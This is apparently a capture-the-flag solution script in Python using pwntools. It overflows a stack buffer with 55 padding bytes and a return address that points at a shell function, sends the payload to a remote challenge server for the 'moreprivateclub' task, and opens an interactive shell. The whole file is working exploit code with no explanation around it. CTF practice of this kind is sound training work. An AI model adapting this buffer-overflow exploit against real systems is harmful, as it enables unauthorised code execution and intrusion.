from pwn import *

shell = 0x00401203
shell = 0x00401235

offset = 47 + 8
payload = b'A' * offset + p64(shell)
print(payload)

# p = process('./moreprivateclub')
p = remote('moreprivateclub.challs.olicyber.it', 10016)
p.sendline('18')
p.sendline(payload)
p.interactive()
